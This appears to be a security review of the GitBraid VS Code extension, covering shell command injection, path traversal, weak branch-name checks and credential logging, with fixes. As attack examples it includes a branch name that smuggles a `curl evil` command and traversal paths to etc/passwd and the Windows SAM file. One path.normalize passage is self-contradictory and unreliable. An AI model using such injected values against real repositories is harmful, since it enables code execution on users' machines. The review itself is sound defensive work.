# Security Review

GitBraid is a desktop extension operating on the user's own checkouts, so
the main threats are:

1. Command injection through untrusted inputs that end up in `git`
   commands (branch names, file paths, commit messages).
2. Path traversal through crafted relative paths.
3. Reading/writing outside the intended worktree (`.gitignore`,
   `.worktrees/`, user files).

The codebase has defences in some places but they are inconsistent.

## Systemic issue — shell string concatenation

The code base uses `util.promisify(child_process.exec)` plus
template-string concatenation almost everywhere git is invoked:

| File | Example |
| --- | --- |
| `gitFunctions.ts:122-142` | `'git ' + args` where `args` is a pre-built string |
| `branchStackService.ts:198` | `git.worktree.add(\`-b "${branchName}" "${absPath}" "${base}"\`)` |
| `diffEngine.ts:134` | `\`git diff HEAD -- "${safeRelative}"\`` |
| `diffEngine.ts:164` | `\`git diff "${mergeBase}" -- "${safeRelative}"\`` |
| `diffEngine.ts:181` | `\`git merge-base "${ref1}" "${ref2}"\`` |
| `hunkRouter.ts:175` | Uses `spawn(['git', 'apply', '--index', '-'], …)` ✅ (good) |
| `mbcApi.ts:139` | `\`git commit${gpgFlag} -m "${safeMsg}"\`` |
| `mbcApi.ts:154` | `\`git add -- ${paths}\`` |
| `rebaseSuggestionService.ts:158` | `\`git rebase "${safeBase}"\`` |
| `rebaseSuggestionService.ts:181` | `\`git rev-list --count "${safe(childBranch)}..${safe(parentBranch)}"\`` |
| `stackResolver.ts:113` | `\`git diff "${safeBase}"..."${safeTop}" -- "${safeFile}"\`` |
| `stackResolver.ts:143` | `\`git show "${safeBranch}:${safeFile}"\`` |
| `branchScmProvider.ts:256` | `\`git commit -m ${JSON.stringify(message)}\`` |

The only consistent mitigation used is `.replaceAll('"', '\\"')` — but
that blocks only one shell metacharacter. An attacker-controlled branch
name, commit message or path can inject `$(…)`, `` ` ``, `;`, `|`,
`&&`, `\n`, or redirection operators. The "attacker" in this threat
model is anyone who can:

- Open a PR whose remote branch name is `main$(curl evil)`.
- Persuade the user to pick a QuickPick entry with such a name.
- Hand-edit `.worktrees/local-config.json`.

### Fix

Replace `exec` with `spawn` + argv everywhere:

```ts
import { spawn } from 'node:child_process'
function run(args: string[], opts: { cwd: string }) {
    return new Promise<string>((resolve, reject) => {
        const child = spawn('git', args, { ...opts, shell: false })
        // collect stdout/stderr, resolve/reject on close
    })
}
```

This removes every injection surface in one go and lets you delete all
the ad-hoc `_sanitise` / `safe()` helpers, which are individually
inadequate anyway (see next section).

## `_sanitise` and `_sanitisePath` are not sufficient

`diffEngine.ts:197-202`

```ts
private _sanitisePath(relativePath: string): string {
    const normalised = path.normalize(relativePath).replace(/^(\.\.\/|\.\.\\)+/, '')
    return normalised.replaceAll('"', String.raw`"`)  // no-op — see 02-bugs
}
```

- Only strips **leading** `../` segments; `foo/../../../etc/passwd`
  survives because `path.normalize` collapses it to `../../etc/passwd`
  **only if** there are no preceding non-`..` segments. Verify with
  `path.normalize('foo/../../../etc/passwd')` = `'../../etc/passwd'` —
  actually fine here — but
  `path.normalize('a/../../../etc/passwd')` = `'../../etc/passwd'`
  does get stripped of its leading `..`, leaving `etc/passwd`. It's
  subtle enough that reviewers shouldn't have to reason about it.
- The quote-escape is a no-op (see `02-bugs-and-correctness.md`).
- On Windows, backslashes in `relativePath` aren't handled; a path like
  `..\..\windows\system32\config\sam` is not stripped because the
  leading-segment regex matches only `\.\.\\`.

`stackResolver.ts:158-164` has the same weakness.

### Fix

Validate that the resolved path is still inside the repo root:

```ts
const resolved = path.resolve(wsRoot, relativePath)
if (!resolved.startsWith(wsRoot + path.sep)) {
    throw new Error('path escapes workspace root')
}
```

Then pass the path as an argv entry, never interpolated.

## Branch name validation is permissive

`branchStackService.ts:13`

```ts
const BRANCH_NAME_RE = /^[a-zA-Z0-9_./-]+$/
```

This passes values git rejects (`..`, leading `/`, trailing `/`,
`@{`, `.lock`, whitespace before `/`, consecutive dots, etc.). Use
`git check-ref-format --branch <name>` via `spawn` to get correct
semantics. The regex also permits `../../foo` as a single "valid"
name because `.` and `/` are in the allowed set.

## `.gitignore` injection

`extension.ts:458`:

```ts
await vscode.workspace.fs.writeFile(uri, Uint8Array.from(Buffer.from(content + '\n## added by vscode extension \'nihobbs.gitbraid\'\n.worktrees/\n')))
```

`content` is the existing `.gitignore`, which could itself contain
arbitrary text. That's fine here (it's just being appended to), but note
that both `extension.ts:442-459` and `configService.ts:287-313` write
to `.gitignore` independently, racing each other on activation. If
they race, one of them may overwrite the other's entry. Consolidate to
one owner.

## Temporary-file writes without sanitisation

`gitFunctions.ts:295`

```ts
const showUri = vscode.Uri.joinPath(tempDir, relativePath.replace('/', '_'))
```

Only the **first** `/` is replaced (the `String.prototype.replace`
without the `g` flag or `replaceAll`). A file at `src/a/b/c.ts` becomes
`src_a/b/c.ts` inside `tempDir`, still creating subdirectories in a
user-controlled layout. Not critical, but combined with a crafted
`..\` on Windows it could escape `tempDir`.

## Config file trust boundary

`ConfigService._readFromDisk` trusts `local-config.json` enough to use
its values as command arguments (via `BranchStackService.addBranch` →
`_createWorktree`). If a user has a shared dev container with this file
committed (despite the warning not to), any change pushed by a
contributor executes commands in the reviewer's shell on open.

Mitigations:

- Never commit `local-config.json` (already handled by `_ensureGitignore`).
- Pair the file with a gitignore rule from the **template**, not from
  the first-run side effect.
- Run `git check-ref-format` on stored branch names before using them.

## Logging sensitive data

`gitFunctions.ts:134`:

```ts
log.error('GitErrorResponse=' + JSON.stringify(e, null, 2))
```

`e` contains the full git command line, which may include credentials
in URLs (e.g. `https://user:token@github.com/...` if the user ever runs
a worktree-add against a remote URL). Filter or redact tokens before
serialising.

## Summary of recommended actions

1. **Replace `exec` with `spawn(…, { shell: false })`** for every git
   invocation. Delete all `_sanitise` helpers.
2. **Validate branch names** with `git check-ref-format --branch`.
3. **Validate relative paths** with a `path.resolve` containment check.
4. **Redact** command-line output before logging it.
5. **Lock** `local-config.json` to a strict JSON schema with per-field
   type checks in `isValidConfig`.
